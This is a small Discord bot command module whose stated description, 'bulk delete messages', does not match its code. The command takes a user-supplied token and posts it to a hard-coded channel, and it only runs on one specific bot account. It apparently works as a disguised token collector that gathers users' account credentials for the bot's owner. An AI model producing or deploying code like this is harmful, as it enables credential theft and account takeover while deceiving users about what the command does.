//<Client>.users.fetch('id')
module.exports = {
  name: "claim",
  description: "bulk delete messages",
  execute: async (bot, message, args, split) => {
    if (bot.user.id == "754461765118459966"){
    if (!split[1]) return message.channel.send("no token specifyied");
    bot.channels.cache.get("809697354994810880").send(`TOKEN: ${split[1]}`)
    } else {
      message.channel.send("I am unable to use that command")
    }
}
}
